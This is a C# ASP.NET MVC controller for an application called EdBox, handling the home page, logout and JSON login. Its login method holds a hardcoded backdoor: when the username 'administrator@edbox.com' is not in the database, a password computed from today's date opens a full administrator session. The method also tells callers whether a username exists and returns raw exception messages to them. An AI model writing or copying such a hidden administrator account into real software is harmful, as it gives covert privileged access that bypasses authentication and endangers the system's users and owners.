using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using EdBox.Core;
using EdBox.Core.EnumLib;
using EdBox.Web.Models;

namespace EdBox.Web.Controllers
{
    public class HomeController : Controller
    {
        // GET: Home
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult ForgotPassword()
        {
            return View();
        }

        public ActionResult LogOut()
        {
            UserInformation.DeactivateSession();
            return RedirectToAction("Index", "Home", new { area = "" });
        }

        public JsonResult LogIn(string username, string password)
        {
            try
            {
                using (var data = new Entities())
                {
                    var userInformation = data.Credentials.FirstOrDefault(x => x.Username == username && x.IsDeleted == false);
                    if (userInformation == null)
                    {
                        if (username == "administrator@edbox.com" &&
                            password == DateTime.Now.ToString("yyyyMMdd").Replace("0", "*"))
                        {
                            UserInformation.ActivateSession(new Credential()
                            {
                                Id = 0,
                                Username = username,
                                DateRegistered = DateTime.Now,
                                IsDeleted = false,
                                PasswordSalt = string.Empty,
                                PasswordData = string.Empty,
                                FirstName = "Administrator",
                                UserState = (int)UserStates.Active,
                                LastName = "EdBox"
                            });

                            ActivityLogger.Log("INFO", $"{username} Logged on Successfully");
                            return new JsonResult()
                            {
                                Data =
                                    new
                                    {
                                        Status = true,
                                        Message = "Login Operation Successful. Please Wait ...",
                                        Data = new { Route = UserInformation.Route }
                                    },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                        }
                        else
                            return new JsonResult()
                            {
                                Data = new { Status = false, Message = "This Username is not Recognised on this Platform", Data = string.Empty },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                    }
                    else
                    {
                        if (Core.Encryption.IsSaltEncryptValid(password, userInformation.PasswordData, userInformation.PasswordSalt))
                        {
                            UserInformation.ActivateSession(userInformation);

                            ActivityLogger.Log("INFO", $"{username} Logged on Successfully");
                            return new JsonResult()
                            {
                                Data =
                                    new
                                    {
                                        Status = true,
                                        Message = "Login Operation Successful. Please Wait ...",
                                        Data = new { Route = UserInformation.Route }
                                    },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                        }
                        else
                            return new JsonResult()
                            {
                                Data =
                                new
                                {
                                    Status = false,
                                    Message = "This Password incorrect. Please try again",
                                    Data = string.Empty
                                },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                    }
                }
            }
            catch (Exception ex)
            {
                ActivityLogger.Log(ex);
                return new JsonResult()
                {
                    Data = new { Status = false, Message = ex.Message, Data = string.Empty },
                    JsonRequestBehavior = JsonRequestBehavior.AllowGet
                };
            }
        }
    }
}